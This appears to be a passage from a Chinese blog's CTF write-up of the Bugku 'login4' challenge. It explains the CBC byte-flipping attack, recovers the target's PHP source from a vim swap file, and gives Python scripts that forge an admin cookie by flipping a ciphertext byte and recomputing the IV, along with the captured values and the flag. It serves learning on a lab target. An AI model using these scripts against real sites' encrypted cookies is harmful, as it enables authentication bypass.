href="#解密原理图：" class="headerlink" title="解密原理图："></a>解密原理图：</h2><img src="/2019/10/19/【wp】bugku-login4-CBC字节翻转攻击/CBC_2.png" title="XYTK"><h2 id="翻转攻击原理图："><a href="#翻转攻击原理图：" class="headerlink" title="翻转攻击原理图："></a>翻转攻击原理图：</h2><img src="/2019/10/19/【wp】bugku-login4-CBC字节翻转攻击/CBC_3.png" title="XYTK"><p>这里可以注意到前一块Ciphertext用来产生下一块明文，如果我们改变前一块Ciphertext中的一个字节，然后和下一块解密后的密文xor，就可以得到一个不同的明文，而这个明文是我们可以控制的。利用这一点，我们就欺骗服务端或者绕过过滤器。</p><h2 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h2><blockquote><p>当我们的一个值C是由A和B异或得到<br>C = A XOR B<br>那么<br>A XOR B XOR C很明显是=0的<br>当我们知道B和C之后，想要得到A的值也很容易<br>A = B XOR C<br>因此，A XOR B XOR C等于0。有了这个公式，我们可以在XOR运算的末尾处设置我们自己的值，即可改变。</p></blockquote><hr><h1 id="bugku-login4"><a href="#bugku-login4" class="headerlink" title="bugku-login4"></a>bugku-login4</h1><p>打开是一个登录页面。</p><p>页面如下：</p><img src="/2019/10/19/【wp】bugku-login4-CBC字节翻转攻击/log0.png" title="XYTK"><p>随便输入后登录</p><img src="/2019/10/19/【wp】bugku-login4-CBC字节翻转攻击/login1.png" title="XYTK"><p>使用admin登录后显示</p><blockquote><p>admin are not allowed to login</p></blockquote><p>没发现注入点后，进行扫描</p><img src="/2019/10/19/【wp】bugku-login4-CBC字节翻转攻击/login2.png" title="XYTK"><p>访问该目录，能够得到一个index.php.swp文件，该文件是使用vi编辑器时自动生成的，在非正常状态下退出没有被删除。</p><p>使用vim -r 文件名还原。</p><p>得到代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">&lt;title&gt;Login Form&lt;/title&gt;</span><br><span class="line">&lt;link href=&quot;static/css/style.css&quot; rel=&quot;stylesheet&quot; type=&quot;text/css&quot; /&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; src=&quot;static/js/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">$(document).ready(function() &#123;</span><br><span class="line">$(&quot;.username&quot;).focus(function() &#123;</span><br><span class="line">$(&quot;.user-icon&quot;).css(&quot;left&quot;,&quot;-48px&quot;);</span><br><span class="line">&#125;);</span><br><span class="line">$(&quot;.username&quot;).blur(function() &#123;</span><br><span class="line">$(&quot;.user-icon&quot;).css(&quot;left&quot;,&quot;0px&quot;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$(&quot;.password&quot;).focus(function() &#123;</span><br><span class="line">$(&quot;.pass-icon&quot;).css(&quot;left&quot;,&quot;-48px&quot;);</span><br><span class="line">&#125;);</span><br><span class="line">$(&quot;.password&quot;).blur(function() &#123;</span><br><span class="line">$(&quot;.pass-icon&quot;).css(&quot;left&quot;,&quot;0px&quot;);</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">define(&quot;SECRET_KEY&quot;, file_get_contents(&apos;/root/key&apos;));</span><br><span class="line">define(&quot;METHOD&quot;, &quot;aes-128-cbc&quot;);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">//得到初始向量   16位</span><br><span class="line">function get_random_iv()</span><br><span class="line">&#123;</span><br><span class="line">    $random_iv=&apos;&apos;;</span><br><span class="line">    for($i=0;$i&lt;16;$i++)</span><br><span class="line">&#123;</span><br><span class="line">        $random_iv.=chr(rand(1,255));</span><br><span class="line">    &#125;</span><br><span class="line">    return $random_iv;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function login($info)</span><br><span class="line">&#123;</span><br><span class="line">    $iv = get_random_iv();</span><br><span class="line">    $plain = serialize($info);   //序列化</span><br><span class="line">    $cipher = openssl_encrypt($plain, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv);     //密文</span><br><span class="line">    $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];</span><br><span class="line">//设置cookie</span><br><span class="line">    setcookie(&quot;iv&quot;, base64_encode($iv));</span><br><span class="line">    setcookie(&quot;cipher&quot;, base64_encode($cipher));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function check_login()&#123;</span><br><span class="line">    if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">//base64_decode解码</span><br><span class="line">        $cipher = base64_decode($_COOKIE[&apos;cipher&apos;]);</span><br><span class="line">        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);</span><br><span class="line">        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))</span><br><span class="line">&#123;</span><br><span class="line">            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&lt;/p&gt;&quot;);</span><br><span class="line">            $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];</span><br><span class="line">        &#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">            die(&quot;ERROR!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//显示账号信息</span><br><span class="line">function show_homepage()</span><br><span class="line">&#123;</span><br><span class="line">    if ($_SESSION[&quot;username&quot;]===&apos;admin&apos;)</span><br><span class="line">&#123;</span><br><span class="line">        echo &apos;&lt;p&gt;Hello admin&lt;/p&gt;&apos;;</span><br><span class="line">        echo &apos;&lt;p&gt;Flag is $flag&lt;/p&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">        echo &apos;&lt;p&gt;hello &apos;.$_SESSION[&apos;username&apos;].&apos;&lt;/p&gt;&apos;;</span><br><span class="line">        echo &apos;&lt;p&gt;Only admin can see flag&lt;/p&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &apos;&lt;p&gt;&lt;a href=&quot;loginout.php&quot;&gt;Log out&lt;/a&gt;&lt;/p&gt;&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">    $username = (string)$_POST[&apos;username&apos;];</span><br><span class="line">    $password = (string)$_POST[&apos;password&apos;];</span><br><span class="line"></span><br><span class="line">//绕过这的等号</span><br><span class="line">    if($username === &apos;admin&apos;)</span><br><span class="line">&#123;</span><br><span class="line">        exit(&apos;&lt;p&gt;admin are not allowed to login&lt;/p&gt;&apos;);</span><br><span class="line">    &#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">        $info = array(&apos;username&apos;=&gt;$username,&apos;password&apos;=&gt;$password);</span><br><span class="line">        login($info);</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    if(isset($_SESSION[&quot;username&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">        check_login();</span><br><span class="line">        show_homepage();</span><br><span class="line">    &#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">        echo &apos;&lt;body class=&quot;login-body&quot;&gt;</span><br><span class="line">                &lt;div id=&quot;wrapper&quot;&gt;</span><br><span class="line">                    &lt;div class=&quot;user-icon&quot;&gt;&lt;/div&gt;</span><br><span class="line">                    &lt;div class=&quot;pass-icon&quot;&gt;&lt;/div&gt;</span><br><span class="line">                    &lt;form name=&quot;login-form&quot; class=&quot;login-form&quot; action=&quot;&quot; method=&quot;post&quot;&gt;</span><br><span class="line">                        &lt;div class=&quot;header&quot;&gt;</span><br><span class="line">                        &lt;h1&gt;Login Form&lt;/h1&gt;</span><br><span class="line">                        &lt;span&gt;Fill out the form below to login to my super awesome imaginary control panel.&lt;/span&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                        &lt;div class=&quot;content&quot;&gt;</span><br><span class="line">                        &lt;input name=&quot;username&quot; type=&quot;text&quot; class=&quot;input username&quot; value=&quot;Username&quot; onfocus=&quot;this.value=\&apos;\&apos;&quot; /&gt;</span><br><span class="line">                        &lt;input name=&quot;password&quot; type=&quot;password&quot; class=&quot;input password&quot; value=&quot;Password&quot; onfocus=&quot;this.value=\&apos;\&apos;&quot; /&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                        &lt;div class=&quot;footer&quot;&gt;</span><br><span class="line">                        &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Login&quot; class=&quot;button&quot; /&gt;</span><br><span class="line">                        &lt;/div&gt;</span><br><span class="line">                    &lt;/form&gt;</span><br><span class="line">                &lt;/div&gt;</span><br><span class="line">            &lt;/body&gt;&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>关键代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function check_login()&#123;</span><br><span class="line">    if(isset($_COOKIE[&apos;cipher&apos;]) &amp;&amp; isset($_COOKIE[&apos;iv&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">//base64_decode解码</span><br><span class="line">        $cipher = base64_decode($_COOKIE[&apos;cipher&apos;]);</span><br><span class="line">        $iv = base64_decode($_COOKIE[&quot;iv&quot;]);</span><br><span class="line">        if($plain = openssl_decrypt($cipher, METHOD, SECRET_KEY, OPENSSL_RAW_DATA, $iv))</span><br><span class="line">&#123;</span><br><span class="line">            $info = unserialize($plain) or die(&quot;&lt;p&gt;base64_decode(&apos;&quot;.base64_encode($plain).&quot;&apos;) can&apos;t unserialize&lt;/p&gt;&quot;);</span><br><span class="line">            $_SESSION[&apos;username&apos;] = $info[&apos;username&apos;];</span><br><span class="line">        &#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">            die(&quot;ERROR!&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>整体流程为：</p><p>判断是否是admin=&gt;生成IV=&gt;将输入序列化=&gt;加密并保存IV和cipher的base64编码值=&gt;base64解码=&gt;解密=&gt;若是admin=&gt;显示flag</p><p>通过发送更改之后的iv和cipher值能够改变最终反序列化的结果实现绕过。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$str=array(&apos;username&apos;=&gt;&apos;zdmin&apos;,&apos;password&apos;=&gt;&apos;aaaaa&apos;);</span><br><span class="line">echo serialize($str);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">序列化的结果：</span><br><span class="line">a:2:&#123;s:8:&quot;username&quot;;s:5:&quot;zdmin&quot;;s:8:&quot;password&quot;;s:5:&quot;aaaaa&quot;;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>分块：<br>a:2:{s:8:”userna<br>me”;s:5:”zdmin”;<br>s:8:”password”;s<br>:5:”aaaaa”;</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">抓包得到初始向量和密文的值：</span><br><span class="line">iv = eHhqTY7a%2FTLcVNva%2Blt3FQ%3D%3D</span><br><span class="line">cipher=hifeZ%2Fb9QH4F7fyx%2FIN8cbAkmVA%2FgyisOAmRVASFIAFeFe0gexxdGQreuy%2F2sSOyz0WZDJtjGstYpTM0oWUdXw%3D%3D</span><br></pre></td></tr></table></figure><p>通过以下脚本，更改第一块的密文值，使得在解密过程中，zdmin变为admin。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">import base64</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">iv_raw=&apos;eHhqTY7a%2FTLcVNva%2Blt3FQ%3D%3D&apos;  #这里填写第一次返回的iv值</span><br><span class="line">cipher_raw=&apos;hifeZ%2Fb9QH4F7fyx%2FIN8cbAkmVA%2FgyisOAmRVASFIAFeFe0gexxdGQreuy%2F2sSOyz0WZDJtjGstYpTM0oWUdXw%3D%3D&apos;  #这里填写第一次返回的cipher值</span><br><span class="line">print &quot;[*]原始iv和cipher&quot;</span><br><span class="line">print &quot;iv_raw:  &quot; + iv_raw</span><br><span class="line">print &quot;cipher_raw:  &quot; + cipher_raw</span><br><span class="line">print &quot;[*]对cipher解码，进行反转&quot;</span><br><span class="line">cipher = base64.b64decode(urllib.unquote(cipher_raw))</span><br><span class="line">#a:2:&#123;s:8:&quot;username&quot;;s:5:&quot;zdmin&quot;;s:8:&quot;password&quot;;s:5:&quot;12345&quot;&#125;</span><br><span class="line">#s:2:&#123;s:8:&quot;userna</span><br><span class="line">#me&quot;;s:5:&quot;zdmin&quot;;</span><br><span class="line">#s:8:&quot;password&quot;;s</span><br><span class="line">#:3:&quot;12345&quot;;&#125;</span><br><span class="line">xor_cipher = cipher[0:9] +  chr(ord(cipher[9]) ^ ord(&apos;z&apos;) ^ ord(&apos;a&apos;)) + cipher[10:]  #根据异或的原理，最终得到的</span><br><span class="line">xor_cipher=urllib.quote(base64.b64encode(xor_cipher))</span><br><span class="line">print &quot;反转后的cipher：&quot; + xor_cipher</span><br><span class="line"></span><br><span class="line"># cipher更改为hifeZ/b9QH4F9vyx/IN8cbAkmVA/gyisOAmRVASFIAFeFe0gexxdGQreuy/2sSOyz0WZDJtjGstYpTM0oWUdXw%3D%3D;</span><br></pre></td></tr></table></figure><p>在HTTP请求包中cookie设置iv和cipher。发现提示不能得到反序列化的结果，base64 decode后发现已经变为admin,但第一块密文的改变导致第一块的明文发生改变。</p><p>明文和第一块的密文保持不变，只能通过重新计算iv的值得到想要的明文。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line"></span><br><span class="line">import base64</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">cipher = &apos;JCko+9LNNgp+8j7ld/oURm1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6ImFhYWFhIjt9&apos;   #填写提交后所得的无法反序列化密文</span><br><span class="line">iv = &apos;eHhqTY7a%2FTLcVNva%2Blt3FQ%3D%3D&apos;                         #一开始提交的iv</span><br><span class="line"></span><br><span class="line">#cipher = urllib.unquote(cipher)</span><br><span class="line">cipher = base64.b64decode(cipher)</span><br><span class="line">iv = base64.b64decode(urllib.unquote(iv))</span><br><span class="line">newIv = &apos;&apos;</span><br><span class="line">right = &apos;a:2:&#123;s:8:&quot;userna&apos;                                      #被损坏前正确的明文</span><br><span class="line">for i in range(16):</span><br><span class="line">    newIv += chr(ord(right[i])^ord(iv[i])^ord(cipher[i]))       #这一步相当于把原来iv中不匹配的部分修改过来</span><br><span class="line">print urllib.quote(base64.b64encode(newIv))</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">得到最终的iv和cipher值：</span><br><span class="line">iv=PWtwjCdk8QCYhJBM6NMNMg%3D%3D;</span><br><span class="line">cipher=hifeZ/b9QH4F9vyx/IN8cbAkmVA/gyisOAmRVASFIAFeFe0gexxdGQreuy/2sSOyz0WZDJtjGstYpTM0oWUdXw%3D%3D</span><br></pre></td></tr></table></figure><p>重新发送HTTP包后返回flag</p><p>得到flag:SKCTF{CBC_wEB_cryptography_6646dfgdg6}</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这种web和Crypto结合的问题还是有难度的，逻辑上捋通就行了。</p><p>在理解的过程中，想到改变第二块对应位置的密文不行吗？思考之后发现，如果只是改变第一块的内容，能写脚本计算对应的iv值；若改变第二块的内容，则会导致第三块的密文出错，仍不能正常反序列化得到结果。（若强行使用这种方法，需要改变之后的所有块的密文，显然是更加麻烦和不易实现的）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;题目中遇到了CBC字节翻转攻击，借此机会系统的学习一下。&lt;/p&gt;
&lt;p&gt;CBC字节翻转攻击的精髓在于损坏密文来改变明文。&lt;/p&gt;
&lt;h2 i
      
    
    </summary>
    
    
      <category term="web" scheme="https://xytk0x0.github.io/categories/web/"/>
    
      <category term="Crypto" scheme="https://xytk0x0.github.io/categories/Crypto/"/>
    
    
      <category term="web" scheme="https://xytk0x0.github.io/tags/web/"/>
    
      <category term="CTF" scheme="https://xytk0x0.github.io/tags/CTF/"/>
    
      <category term="wp" scheme="https://xytk0x0.github.io/tags/wp/"/>
    
      <category term="Crypto" scheme="https://xytk0x0.github.io/tags/Crypto/"/>
    
  </entry>
  
</feed>
